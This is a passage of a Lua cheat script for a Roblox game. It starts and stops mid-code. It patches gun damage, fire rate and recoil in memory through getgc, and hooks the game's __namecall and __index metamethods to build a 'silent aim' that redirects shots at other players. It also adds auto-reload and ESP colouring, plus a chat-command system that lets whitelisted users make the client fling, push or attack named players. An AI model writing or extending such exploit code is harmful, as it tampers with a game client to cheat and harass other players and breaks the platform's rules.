                        return tostring(v)
                    end
                end
            end
        end

        -- 4. ReplicatedStorage — all descendants, any StringValue with mode/game/round in name
        local rs = game:GetService("ReplicatedStorage")
        for _, obj in ipairs(rs:GetDescendants()) do
            local n = obj.Name:lower()
            if obj:IsA("StringValue") then
                if n:find("gamemode") or n:find("mode") or n:find("roundtype")
                or n:find("gametype") then
                    if obj.Value ~= "" then return obj.Value end
                end
            elseif obj:IsA("ValueBase") then
                if n:find("gamemode") or n:find("roundtype") then
                    local v = tostring(obj.Value)
                    if v ~= "" and v ~= "0" then return v end
                end
            end
        end

        -- 5. LocalPlayer data (leaderstats / PlayerData attributes)
        local pd = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
        if pd then
            for k, v in pairs(pd:GetAttributes()) do
                if k:lower():find("mode") then return tostring(v) end
            end
        end

        -- 6. getgc() — scan tables for a "GameMode", "gameMode", or "CurrentMode" key
        local ok, gc = pcall(getgc, true)
        if ok and type(gc) == "table" then
            for _, t in next, gc do
                if type(t) == "table" then
                    local gm = rawget(t, "GameMode") or rawget(t, "gameMode")
                             or rawget(t, "CurrentMode") or rawget(t, "currentMode")
                             or rawget(t, "RoundType")   or rawget(t, "roundType")
                    if type(gm) == "string" and gm ~= "" then return gm end
                end
            end
        end

        return nil
    end

    -- Returns true when the active gamemode is Knives Out
    isKnivesOut = function()
        local mode = getGameMode()
        if not mode then return false end
        local m = mode:lower()
        return m:find("knives") ~= nil or m:find("knife") ~= nil
            or m == "ko" or m == "knivesout" or m:find("knives.out") ~= nil
    end

    -- Returns true when the active gamemode is Zombies
    isZombieMode = function()
        local mode = getGameMode()
        if not mode then return false end
        local m = mode:lower()
        return m:find("zombie") ~= nil or m:find("zombies") ~= nil or m == "z"
    end

    -- ════════════════════════════════════════════════════════════
    -- END OF MISC TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- GUN TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── Silent Aim Target Picker ──────────────────────────────────────────
    local function getClosestPlayer()
        local cam    = workspace.CurrentCamera
        local cx, cy = cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2
        local fovR   = cfg.FOV or 130
        local best, bestDist = nil, fovR
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer then continue end
            local ch = plr.Character
            if not ch then continue end
            local part = ch:FindFirstChild("HumanoidRootPart") or ch:FindFirstChild("Head")
            if not part then continue end
            local hum = ch:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health <= 0 then continue end
            local pos, onScreen = cam:WorldToViewportPoint(part.Position)
            if not onScreen or pos.Z <= 0 then continue end
            local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(cx, cy)).Magnitude
            if dist < bestDist then bestDist = dist; best = part end
        end
        return best
    end

    -- ── Gun Mods ──────────────────────────────────────────────────────────
    local function _gM()
        local ok, gc = pcall(getgc, true)
        if not ok or type(gc) ~= "table" then return end
        local d   = cfg.GunMod_Damage
        local fr  = cfg.GunMod_FireRate
        local mag = cfg.GunMod_MagazineSize
        local rng = cfg.GunMod_Range
        local rl  = cfg.GunMod_ReloadTime
        local imp = cfg.GunMod_ImpactForce
        local sp  = cfg.GunMod_Spread
        local asp = cfg.GunMod_AimSpread
        local arm = cfg.GunMod_AimRecoilMult
        local hsm = cfg.GunMod_HeadshotMult
        local lm  = cfg.GunMod_LimbMult
        local fa  = cfg.GunMod_ForceAuto
        for _, t in next, gc do
            if type(t) == "table" then
                if rawget(t, "Global") then
                    -- Save Global originals once per reference
                    if not _gmGlobalOrig[t.Global] then
                        pcall(function()
                            _gmGlobalOrig[t.Global] = {
                                HeadshotMultiplier = t.Global.HeadshotMultiplier,
                                LimbMultiplier     = t.Global.LimbMultiplier,
                            }
                        end)
                    end
                    pcall(function()
                        t.Global.HeadshotMultiplier = hsm
                        t.Global.LimbMultiplier     = lm
                    end)
                end
                local nameOk, dmgOk = false, false
                pcall(function() nameOk = type(t.Name) == "string" end)
                pcall(function() dmgOk  = type(t.Damage) == "number" end)
                if nameOk and dmgOk then
                    -- Save gun config originals once per table reference
                    if not _gmOriginals[t] then
                        pcall(function()
                            local recoilOrig = nil
                            if rawget(t, "Recoil") then
                                recoilOrig = {
                                    Kick       = t.Recoil.Kick,
                                    Rot        = t.Recoil.Rot,
                                    CameraKick = t.Recoil.CameraKick,
                                }
                            end
                            _gmOriginals[t] = {
                                Damage        = t.Damage,
                                FireRate      = t.FireRate,
                                Range         = t.Range,
                                MaxRange      = t.MaxRange,
                                ReloadTime    = t.ReloadTime,
                                ImpactForce   = t.ImpactForce,
                                Spread        = t.Spread,
                                AimSpread     = t.AimSpread,
                                AimRecoilMult = t.AimRecoilMult,
                                FireMode      = t.FireMode,
                                Recoil        = recoilOrig,
                            }
                        end)
                    end
                    pcall(function()
                        t.Damage        = d
                        t.FireRate      = fr
                        -- MagazineSize intentionally not patched — let the server track real ammo
                        t.Range         = rng
                        t.MaxRange      = rng
                        t.ReloadTime    = rl
                        t.ImpactForce   = imp
                        t.Spread        = sp
                        t.AimSpread     = asp
                        t.AimRecoilMult = arm
                        if rawget(t, "Recoil") then
                            pcall(function()
                                t.Recoil.Kick       = Vector3.new(0, 0, 0)
                                t.Recoil.Rot        = Vector3.new(0, 0, 0)
                                t.Recoil.CameraKick = 0
                            end)
                        end
                        if fa then t.FireMode = "Auto" end
                    end)
                end
            end
        end
    end

    -- Stops the gun mod Heartbeat loop and restores all patched values
    _xgM = function()
        if _AUTO.gunModConn then _AUTO.gunModConn:Disconnect(); _AUTO.gunModConn = nil end
        -- Restore gun config tables
        for ref, orig in pairs(_gmOriginals) do
            pcall(function()
                ref.Damage        = orig.Damage
                ref.FireRate      = orig.FireRate
                ref.Range         = orig.Range
                ref.MaxRange      = orig.MaxRange
                ref.ReloadTime    = orig.ReloadTime
                ref.ImpactForce   = orig.ImpactForce
                ref.Spread        = orig.Spread
                ref.AimSpread     = orig.AimSpread
                ref.AimRecoilMult = orig.AimRecoilMult
                ref.FireMode      = orig.FireMode
                if orig.Recoil and rawget(ref, "Recoil") then
                    ref.Recoil.Kick       = orig.Recoil.Kick
                    ref.Recoil.Rot        = orig.Recoil.Rot
                    ref.Recoil.CameraKick = orig.Recoil.CameraKick
                end
            end)
        end
        _gmOriginals = {}
        -- Restore Global headshot/limb multipliers
        for ref, orig in pairs(_gmGlobalOrig) do
            pcall(function()
                ref.HeadshotMultiplier = orig.HeadshotMultiplier
                ref.LimbMultiplier     = orig.LimbMultiplier
            end)
        end
        _gmGlobalOrig = {}
    end

    -- Starts gun mod: patches on equip and every 2 s via Heartbeat
    _sgM = function()
        if not _gcSupported then
            UILib.notify("Gun Mods", "Your executor doesn't support getgc — gun mods unavailable.", 5)
            cfg.GunModEnabled = false
            return
        end
        _xgM()
        _gM()
        local function _isGun(t)
            if not t:IsA("Tool") then return false end
            local n = t.Name:lower()
            return not (n:find("knife") or n:find("bandage") or n:find("push")
                     or n:find("pepper") or n:find("flash") or n:find("bear") or n:find("trap"))
        end
        local _hooked = {}
        local function _hookEquip(tool)
            if _hooked[tool] then return end
            _hooked[tool] = true
            pcall(function()
                tool.Equipped:Connect(function()
                    if cfg.GunModEnabled then task.wait(0.15); _gM() end
                end)
            end)
        end
        local function _onAdded(child)
            if not cfg.GunModEnabled or not _isGun(child) then return end
            task.wait(0.4); _gM(); _hookEquip(child)
        end
        local function _hookChar(ch)
            if not ch then return end
            ch.ChildAdded:Connect(_onAdded)
            for _, c in ipairs(ch:GetChildren()) do
                task.spawn(function() if _isGun(c) then _hookEquip(c) end end)
            end
        end
        local function _hookBP(bp)
            if not bp then return end
            bp.ChildAdded:Connect(_onAdded)
            for _, c in ipairs(bp:GetChildren()) do
                task.spawn(function() if _isGun(c) then _hookEquip(c) end end)
            end
        end
        _hookChar(LocalPlayer.Character)
        _hookBP(LocalPlayer:FindFirstChildOfClass("Backpack"))
        LocalPlayer.CharacterAdded:Connect(function(ch)
            if cfg.GunModEnabled then
                _hooked = {}
                _hookChar(ch)
                task.wait(0.1)
                _hookBP(LocalPlayer:FindFirstChildOfClass("Backpack"))
            end
        end)
        local _t2 = 0
        _AUTO.gunModConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.GunModEnabled then _xgM(); return end
            _t2 = _t2 + dt
            if _t2 < 2 then return end
            _t2 = 0
            _gM()
        end)
    end

    -- ── Auto Reload ───────────────────────────────────────────────────────
    local _VIM           = game:GetService("VirtualInputManager")
    local _UIS           = game:GetService("UserInputService")
    local _lastReloadTap = 0
    local _ammoFields = {
        "bullets","Bullets","ammo","Ammo","currentAmmo","CurrentAmmo",
        "Mag","mag","Magazine","magazine","CurrentMag","currentMag",
        "MagCount","magCount","ClipSize","clipSize","clipAmmo","ClipAmmo",
    }
    local function _getAmmo()
        local ok, gc = pcall(getgc, true)
        if not ok or type(gc) ~= "table" then return nil end
        for _, t in next, gc do
            if type(t) ~= "table" then continue end
            for _, f in next, _ammoFields do
                local v = rawget(t, f)
                if type(v) == "number" and v >= 0 and v < 10000 then
                    return v
                end
            end
        end
        return nil
    end
    local function _tapR(gunTool)
        -- On mobile SendKeyEvent is unreliable — use packets first, key as backup
        if not _isMobile then
            pcall(function() _VIM:SendKeyEvent(true,  Enum.KeyCode.R, false, game) end)
            task.wait(0.06)
            pcall(function() _VIM:SendKeyEvent(false, Enum.KeyCode.R, false, game) end)
        end
        -- Packet-based reload (works on both platforms, belt-and-suspenders on PC)
        task.spawn(function()
            local pkts = _getPackets()
            if not pkts then return end
            pcall(function() if pkts.startReload then pkts.startReload:Fire({}) end end)
            task.wait(0.05)
            pcall(function() if pkts.reload and gunTool then pkts.reload:Fire({gunTool}) end end)
        end)
    end
    local function _repressM1()
        -- On mobile there is no MB1 — skip the hold-check and just re-fire
        if not _isMobile then
            if not _UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then return end
        end
        local _mouse = LocalPlayer:GetMouse()
        pcall(function() _VIM:SendMouseButtonEvent(_mouse.X, _mouse.Y, 0, true, game, 1) end)
    end
    stopAutoReload = function()
        if _AUTO.reloadConn then _AUTO.reloadConn:Disconnect(); _AUTO.reloadConn = nil end
    end
    startAutoReload = function()
        if not _gcSupported then
            UILib.notify("Auto Reload", "Your executor doesn't support getgc — auto reload unavailable.", 5)
            cfg.AutoReloadEnabled = false
            return
        end
        stopAutoReload()
        -- New ammo-based approach:
        --   1. Poll getgc() every 0.1 s for current bullet count.
        --   2. When ammo drops to 0, fire R once and enter "reloading" state.
        --   3. Poll until ammo rises above 0 (reload finished for this gun type).
        --      Shotguns refill shell-by-shell so this naturally handles each pump.
        --   4. Re-press MB1 so the gun resumes firing without any manual click.
        --   5. Fallback: if getgc() never finds ammo data, tap R every 0.4 s
        --      (old behaviour) so the feature is never silently broken.
        local _scanTick     = 0     -- accumulates dt between getgc scans
        local _prevAmmo     = nil   -- last known bullet count
        local _reloading    = false -- true while waiting for ammo to refill
        local _fallbackT    = 0     -- fallback timer when no ammo table found
        local _noAmmoFor    = 0     -- how long we've had no ammo data (sec)
        local _prevGunName  = nil   -- tracks gun switches so state resets cleanly
        -- On mobile getgc() rarely exposes ammo tables; use a longer fallback
        -- interval so we don't spam R mid-burst on guns like DSA
        local _fallbackRate = _isMobile and 0.8 or 0.4
        _AUTO.reloadConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.AutoReloadEnabled then stopAutoReload(); return end
            -- Only act while a gun is equipped
            local ch = getCharacter()
            if not ch then return end
            local gunTool = nil
            for _, v in ipairs(ch:GetChildren()) do
                if v:IsA("Tool") then
                    local n = v.Name:lower()
                    if v:GetAttribute("Gun")
                       or n:find("gun") or n:find("rifle") or n:find("pistol")
                       or n:find("ak")  or n:find("m4")    or n:find("mp")
                       or n:find("sniper") or n:find("shot") or n:find("smg") or n:find("uzi") then
                        gunTool = v; break
                    end
                end
            end
            if not gunTool then
                _prevAmmo = nil; _reloading = false; _fallbackT = 0; _noAmmoFor = 0; _prevGunName = nil
                return
            end
            -- Reset reload state if the player switched guns
            if gunTool.Name ~= _prevGunName then
                _prevAmmo = nil; _reloading = false; _fallbackT = 0; _noAmmoFor = 0
                _prevGunName = gunTool.Name
            end
            -- Throttle getgc scan to every 0.1 s
            _scanTick = _scanTick + dt
            if _scanTick < 0.1 then return end
            _scanTick = 0
            local ammo = _getAmmo()
            if ammo ~= nil then
                _noAmmoFor = 0
                if not _reloading then
                    -- Detect ammo hitting 0
                    if _prevAmmo ~= nil and _prevAmmo > 0 and ammo <= 0 then
                        _reloading = true
                        task.spawn(function() _tapR(gunTool) end)
                    end
                else
                    -- Waiting for reload to finish — ammo rose back above 0
                    if ammo > 0 then
                        _reloading = false
                        task.spawn(function()
                            task.wait(0.05) -- tiny settle margin
                            _repressM1()
                        end)
                    end
                end
                _prevAmmo = ammo
            else
                -- getgc() found no ammo table — use timed fallback so feature
                -- still works even if the table isn't in GC on this executor
                _noAmmoFor = _noAmmoFor + 0.1
                _fallbackT = _fallbackT + 0.1
                if _fallbackT >= _fallbackRate then
                    _fallbackT = 0
                    task.spawn(function() _tapR(gunTool) end)
                end       -- if _fallbackT >= _fallbackRate
            end           -- else (ammo == nil)
        end)              -- Heartbeat:Connect
    end                   -- startAutoReload

    -- ── Silent Aim ─────────────────────────────────────────────────────────
    -- Full port of Universal Silent Aim
    -- All settings live in cfg.SA_* fields. Hooks set up once at init.
    -- Target cached on RenderStepped so zero Roblox API calls inside hooks.
    -- Raw function references cached BEFORE any hooks so __index is never
    -- triggered inside hook bodies or RenderStepped callbacks.
    local _saRawWorldToScreen     = Camera.WorldToScreenPoint
    local _saRawWorldToViewport   = Camera.WorldToViewportPoint
    local _saRawGetObscuring      = Camera.GetPartsObscuringTarget
    do
        local _saOldNamecall = nil
        local _saOldIndex    = nil
        local _Mouse         = LocalPlayer:GetMouse()
        local _saTarget      = nil   -- cached closest part, updated every frame
        local _saPredAmount  = 0.165

        -- SA FOV circle (independent from aimbot FOV circle)
        local _saFovCircle        = Drawing.new("Circle")
        _saFovCircle.Thickness    = 1
        _saFovCircle.NumSides     = 100
        _saFovCircle.Radius       = 130
        _saFovCircle.Filled       = false
        _saFovCircle.Visible      = false
        _saFovCircle.ZIndex       = 998
        _saFovCircle.Transparency = 1
        _saFovCircle.Color        = Color3.fromRGB(54, 57, 241)

        -- SA target indicator dot
        local _saTargetBox       = Drawing.new("Square")
        _saTargetBox.Visible     = false
        _saTargetBox.ZIndex      = 999
        _saTargetBox.Color       = Color3.fromRGB(54, 57, 241)
        _saTargetBox.Thickness   = 2
        _saTargetBox.Size        = Vector2.new(10, 10)
        _saTargetBox.Filled      = true

        -- Visibility check — uses raw cached Camera method to avoid triggering __index
        local function _saIsVisible(plr)
            local ch  = plr.Character
            local lch = LocalPlayer.Character
            if not (ch and lch) then return false end
            local part = ch:FindFirstChild(cfg.SA_TargetPart) or ch:FindFirstChild("HumanoidRootPart")
            if not part then return false end
            local ok, obs = pcall(function()
                return _saRawGetObscuring(Camera, {part.Position}, {lch, ch})
            end)
            return ok and #obs == 0
        end

        -- Hit chance roll
        local function _saChance()
            if cfg.SA_HitChance >= 100 then return true end
            local roll = math.floor(Random.new():NextNumber(0, 1) * 100) / 100
            return roll <= cfg.SA_HitChance / 100
        end

        -- Get closest player part by screen distance from mouse, respects all settings
        local ValidSAParts = {"Head", "HumanoidRootPart"}
        local function _saGetTarget()
            if not cfg.SilentAimEnabled then return nil end
            local mousePos = _isMobile
                and Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                or  UserInputService:GetMouseLocation()
            local closest, closestDist = nil, cfg.SA_FOVRadius
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr == LocalPlayer then continue end
                if cfg.SA_TeamCheck and plr.Team and LocalPlayer.Team
                and plr.Team == LocalPlayer.Team then continue end
                local ch = plr.Character
                if not ch then continue end
                local hum = ch:FindFirstChildOfClass("Humanoid")
                if not hum or hum.Health <= 0 then continue end
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end
                if cfg.SA_VisibleCheck and not _saIsVisible(plr) then continue end
                local screenPos, onScreen = _saRawWorldToScreen(Camera, hrp.Position)
                if not onScreen then continue end
                local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    if cfg.SA_TargetPart == "Random" then
                        closest = ch[ValidSAParts[math.random(1, #ValidSAParts)]]
                    else
                        closest = ch:FindFirstChild(cfg.SA_TargetPart) or hrp
                    end
                end
            end
            return closest
        end

        -- RenderStepped: cache target + update drawings (safe, not inside a hook)
        RunService.RenderStepped:Connect(function()
            _saTarget     = _saGetTarget()
            _saPredAmount = cfg.SA_PredictionAmount

            -- SA FOV circle follows mouse
            _saFovCircle.Visible = cfg.SilentAimEnabled and cfg.SA_ShowFOV
            if _saFovCircle.Visible then
                _saFovCircle.Radius   = cfg.SA_FOVRadius
                _saFovCircle.Color    = cfg.SA_FOVColor
                _saFovCircle.Position = _isMobile
                    and Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                    or  UserInputService:GetMouseLocation()
            end

            -- SA target indicator
            if cfg.SilentAimEnabled and cfg.SA_ShowTarget and _saTarget and _saTarget.Parent then
                local pri = _saTarget.Parent and (_saTarget.Parent.PrimaryPart or _saTarget)
                local vp, onScreen = _saRawWorldToViewport(Camera, pri.Position)
                _saTargetBox.Color    = cfg.SA_FOVColor
                _saTargetBox.Visible  = onScreen
                _saTargetBox.Position = Vector2.new(vp.X - 5, vp.Y - 5)
            else
                _saTargetBox.Visible = false
            end
        end)

        -- __namecall hook: Raycast + legacy FindPartOnRay methods
        local ok1, err1 = pcall(function()
            _saOldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if cfg.SilentAimEnabled and not checkcaller()
                and self == workspace and _saTarget and _saChance() then
                    local m = cfg.SA_Method
                    if method == "Raycast" and m == "Raycast" then
                        local origin = select(1, ...)
                        if typeof(origin) == "Vector3" then
                            local dir = (_saTarget.Position - origin).Unit * 1000
                            local p = RaycastParams.new()
                            p.FilterType = Enum.RaycastFilterType.Exclude
                            local myChar = LocalPlayer.Character
                            p.FilterDescendantsInstances = myChar and {myChar} or {}
                            -- call raw method directly to avoid UILib hook chain
                            return (workspace.Raycast)(workspace, origin, dir, p)
                        end
                    elseif (method == "FindPartOnRayWithIgnoreList" and m == "FindPartOnRayWithIgnoreList")
                        or (method == "FindPartOnRayWithWhitelist" and m == "FindPartOnRayWithWhitelist")
                        or ((method == "FindPartOnRay" or method == "findPartOnRay") and m == "FindPartOnRay") then
                        local args = {...}
                        local ray = args[2]
                        if typeof(ray) == "Ray" then
                            local dir = (_saTarget.Position - ray.Origin).Unit * 1000
                            args[2] = Ray.new(ray.Origin, dir)
                            return _saOldNamecall(self, table.unpack(args))
                        end
                    end
                end
                return _saOldNamecall(self, ...)
            end))
        end)
        if not ok1 then warn("[SilentAim] Namecall hook failed: " .. tostring(err1)) end

        -- __index hook: Mouse.Hit / Mouse.Target method only
        local ok2, err2 = pcall(function()
            _saOldIndex = hookmetamethod(game, "__index", newcclosure(function(self, index)
                if cfg.SilentAimEnabled and not checkcaller()
                and self == _Mouse and cfg.SA_Method == "Mouse.Hit/Target" and _saTarget then
                    if index == "Target" or index == "target" then
                        return _saTarget
                    elseif index == "Hit" or index == "hit" then
                        if cfg.SA_Prediction then
                            return _saTarget.CFrame + (_saTarget.Velocity * _saPredAmount)
                        else
                            return _saTarget.CFrame
                        end
                    end
                end
                return _saOldIndex(self, index)
            end))
        end)
        if not ok2 then warn("[SilentAim] Index hook failed: " .. tostring(err2)) end
    end

    -- _sSA is called by the toggle — hooks are already live, toggling cfg is enough
    local function _sSA() end

    -- ════════════════════════════════════════════════════════════
    -- END OF GUN TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- VIEWER TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── Viewer helpers ───────────────────────────────────────────
    local viewerConnection = nil

    local function getHealthColor(pct)
        if pct > 0.6 then return Color3.fromRGB(60,210,80)
        elseif pct > 0.3 then return Color3.fromRGB(230,180,30)
        else return Color3.fromRGB(220,60,60) end
    end

    local function isPlayerOnKillerTeam(p)
        if not p or not p.Team then return false end
        local tname = p.Team.Name:lower()
        return tname == "killers" or tname == "killer"
    end

    local function getPlayerESPColor(plr)
        local tname = plr.Team and plr.Team.Name:lower() or ""
        if tname == "killers"    or tname == "killer"    then return Color3.fromRGB(255,  55,  55) end
        if tname == "survivors"  or tname == "survivor"  then return Color3.fromRGB(  0, 220, 100) end
        if tname == "spectators" or tname == "spectator" then return Color3.fromRGB(150, 150, 150) end
        if plr.Team and plr.Team.TeamColor then return plr.Team.TeamColor.Color end
        return Color3.fromRGB(200, 200, 200)
    end

    -- Stop spectating and return camera to local player
    local function stopSpectate()
        spectateTarget = nil
        pcall(function()
            Camera.CameraType = Enum.CameraType.Custom
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then Camera.CameraSubject = hum end
        end)
    end

    -- ── CMDS  (local whitelist + chat-command executor) ──────────────────────
    -- _cmdWhitelist  : { [username] = true } — in-memory only, resets on reload
    -- _cmdChatConns  : { [username] = RBXScriptConnection } — one per player
    -- Whitelisted players can type chat commands and have them auto-executed
    -- on the local client.  Commands: /fling /goto /tp /spectate /pipe /spray
    -- Target arg accepts full username, display name, or first 3+ letters of either.
    -- Forward-declare so _execCmdMsg (defined below) can reference these as
    -- upvalues even though the actual function bodies appear later in the file.
    local SkidFling, doPipeHit, stopPepperAuto, startPepperAuto

    local _cmdWhitelist  = {}
    local _cmdChatConns  = {}

    local function _cmdFindTarget(arg)
        local a = arg:lower():gsub("^%s+",""):gsub("%s+$","")
        if a == "" then return nil end
        for _, p in ipairs(Players:GetPlayers()) do
            if p == LocalPlayer then continue end
            local un = p.Name:lower()
            local dn = p.DisplayName:lower()
            if un == a or dn == a then return p end  -- exact first
        end
        for _, p in ipairs(Players:GetPlayers()) do
            if p == LocalPlayer then continue end
            local un = p.Name:lower()
            local dn = p.DisplayName:lower()
            if un:sub(1,#a) == a or dn:sub(1,#a) == a then return p end  -- prefix
        end
        return nil
    end

    -- Toggle: when true, a /w confirmation is sent back to the whitelisted player
    -- for every command received.  Toggled from the CMDS panel.
    local _cmdPMEnabled = true

    -- Item checks (inline, no forward-ref needed)
    local function _cmdHasPipe()
        for _, parent in ipairs({LocalPlayer.Character, LocalPlayer:FindFirstChildOfClass("Backpack")}) do
            if parent then for _, v in ipairs(parent:GetChildren()) do
                if v:IsA("Tool") and v.Name:lower():find("pipe") then return true end
            end end
        end
        return false
    end
    local function _cmdHasPepper()
        for _, parent in ipairs({LocalPlayer.Character, LocalPlayer:FindFirstChildOfClass("Backpack")}) do
            if parent then for _, v in ipairs(parent:GetChildren()) do
                if v:IsA("Tool") and v.Name:lower():find("pepper") then return true end
            end end
        end
        return false
    end
    -- Reply via the TextChannel the message came in on (works for private chat too).
    -- Falls back to scanning for any open whisper channel with the recipient.
    local function _cmdReplyPM(recipient, replyChannel, text)
        pcall(function()
            if replyChannel and replyChannel.SendAsync then
                replyChannel:SendAsync(text); return
            end
            -- Scan for whisper channel that includes the recipient
            local TCS = game:GetService("TextChatService")
            for _, ch in ipairs(TCS.TextChannels:GetChildren()) do
                if ch:IsA("TextChannel") and ch.Name:lower():find("whisper") then
                    for _, src in ipairs(ch:GetChildren()) do
                        if src:IsA("TextSource") and src.UserId == recipient.UserId then
                            ch:SendAsync(text); return
                        end
                    end
                end
            end
        end)
    end

    -- Push: rapid teleport-into-target bursts; physics collision forces them away.
    local function _cmdPush(targetPlayer)
        task.spawn(function()
            local myChar = LocalPlayer.Character
            local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
            local myHRP  = getHRP()
            if not myChar or not myHum or not myHRP then return end
            local tChar = targetPlayer.Character
            if not tChar then return end
            local tHRP = tChar:FindFirstChild("HumanoidRootPart")
            if not tHRP then return end
            local returnCF  = myHRP.CFrame
            local raw       = tHRP.Position - myHRP.Position
            local pushDir   = Vector3.new(raw.X, 0, raw.Z).Unit
            for _ = 1, 8 do
                pcall(function()
                    myHRP.CFrame    = CFrame.new(tHRP.Position + pushDir * 0.3, tHRP.Position + pushDir * 10)
                    myHRP.Velocity  = pushDir * 500
                end)
                task.wait(0.04)
            end
            task.wait(0.15)
            pcall(function() myHRP.CFrame = returnCF end)
        end)
    end

    -- Send a /w confirmation back to the sender so they know the command ran.
    -- Uses the reply channel when available (private chat → private reply),
    -- otherwise falls back to /w via the general TextChatService channel.
    local function _cmdSendConfirm(sender, cmd, replyChannel)
        if not _cmdPMEnabled then return end
        local text = "/" .. cmd .. " received - MASSACREME-CMDS"
        pcall(function()
            if replyChannel and replyChannel.SendAsync then
                replyChannel:SendAsync(text); return
            end
            local TCS = game:GetService("TextChatService")
            local gen = TCS.TextChannels:FindFirstChild("RBXGeneral")
            if gen then gen:SendAsync("/w " .. sender.Name .. " " .. text) end
        end)
    end

    -- replyChannel: TextChannel the command arrived on (nil = public Chatted event).
    -- Passing it lets _cmdReplyPM reply into private chats directly.
    local function _execCmdMsg(sender, msg, replyChannel)
        if not _cmdWhitelist[sender.Name] then return end
        local cmd, arg = msg:match("^%s*/(%a+)%s*(.*)")
        if not cmd then return end
        cmd = cmd:lower()
        local target = _cmdFindTarget(arg or "")
        if cmd == "fling" then
            if target then
                _cmdSendConfirm(sender, cmd, replyChannel)
                task.spawn(function() SkidFling(target) end)
            end
        elseif cmd == "push" then
            if target then
                _cmdSendConfirm(sender, cmd, replyChannel)
                _cmdPush(target)
            end
        elseif cmd == "pipe" then
            if target then
                if _cmdHasPipe() then
                    _cmdSendConfirm(sender, cmd, replyChannel)
                    task.spawn(function() doPipeHit(target) end)
                else
                    _cmdReplyPM(sender, replyChannel, "Sorry, I dont have that item - MASSACREME-CMDS")
                end
            end
        elseif cmd == "spray" then
            if target then
                if _cmdHasPepper() then
                    _cmdSendConfirm(sender, cmd, replyChannel)
                    cfg.PepperEnabled = true; startPepperAuto(target)
                else
                    _cmdReplyPM(sender, replyChannel, "Sorry, I dont have that item - MASSACREME-CMDS")
                end
            end
        end
    end

    local function _cmdHookPlayer(p)
        if _cmdChatConns[p.Name] then return end
        _cmdChatConns[p.Name] = p.Chatted:Connect(function(msg) _execCmdMsg(p, msg, nil) end)
    end
    -- Hook all current players and any who join
    for _, p in ipairs(Players:GetPlayers()) do _cmdHookPlayer(p) end
    Players.PlayerAdded:Connect(function(p) task.wait(0.5); _cmdHookPlayer(p) end)
    Players.PlayerRemoving:Connect(function(p)
        if _cmdChatConns[p.Name] then
            pcall(function() _cmdChatConns[p.Name]:Disconnect() end)
            _cmdChatConns[p.Name] = nil
        end
        _cmdWhitelist[p.Name] = nil
    end)

    -- Also hook TextChatService for games using the new chat system.
    -- This catches both public chat AND private messages (whispers) from
    -- whitelisted players, since MessageReceived fires for all channels.
    pcall(function()
        local TCS = game:GetService("TextChatService")
        TCS.MessageReceived:Connect(function(message)
            if not message or not message.TextSource then return end
            if message.TextSource.UserId == LocalPlayer.UserId then return end
            local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
            if not sender then return end
            -- Pass the TextChannel so replies go back through the same channel
            _execCmdMsg(sender, message.Text, message.TextChannel)
        end)
    end)

    -- ── openCMDSPanel ───────────────────────────────────────────────────────
    local function openCMDSPanel()
        -- Toggle: clicking CMDS again closes it
        local existing = game:GetService("CoreGui"):FindFirstChild("_MasacreCMDS")
        if existing then existing:Destroy(); return end

        local PW      = 320
        local PAD     = 10
        local HDR_H   = 44
        local ENTRY_H = 30

        -- Measure dynamic height: header + whitelist entries + add section + cmds list
        local wlNames = {}
        for name in pairs(_cmdWhitelist) do table.insert(wlNames, name) end
        local serverPlayers = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and not _cmdWhitelist[p.Name] then
                table.insert(serverPlayers, p)
            end
        end

        local CMDS_LIST_H = 7 * 16 + 10   -- 7 command lines
        local PH = HDR_H + PAD
            + math.max(1, #wlNames) * (ENTRY_H + 4) + 8
            + (#serverPlayers > 0 and (#serverPlayers * (ENTRY_H + 4) + 28) or 32)
            + CMDS_LIST_H + PAD * 2 + 30

        local panelGui = Instance.new("ScreenGui")
        panelGui.Name            = "_MasacreCMDS"
        panelGui.ResetOnSpawn    = false
        panelGui.IgnoreGuiInset  = true
        panelGui.DisplayOrder    = 999999
        panelGui.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
        panelGui.Parent          = game:GetService("CoreGui")

        local panel = Instance.new("CanvasGroup", panelGui)
        panel.Size             = UDim2.fromOffset(PW, math.min(PH, 520))
        panel.BackgroundColor3 = cfg.BG
        panel.BorderSizePixel  = 0
        panel.GroupTransparency = 1
        UILib.addCorner(panel, 12)
        UILib.addStroke(panel, 1.5, cfg.Accent, 0.3)

        local vp = Camera.ViewportSize
        panel.Position = UDim2.fromOffset(
            math.floor(vp.X / 2 - PW / 2),
            math.floor(vp.Y / 2 - math.min(PH,520) / 2)
        )

        local absorb = Instance.new("TextButton", panel)
        absorb.Size = UDim2.new(1,0,1,0); absorb.BackgroundTransparency = 1
        absorb.Text = ""; absorb.BorderSizePixel = 0; absorb.AutoButtonColor = false
        absorb.MouseButton1Click:Connect(function() end)

        local closing = false
        local function closePanel()
            if closing then return end; closing = true
            task.spawn(function()
                for s = 1, 15 do
                    task.wait(0.18/15)
                    if panel and panel.Parent then panel.GroupTransparency = s/15 end
                end
                panelGui:Destroy()
            end)
        end

        -- Header
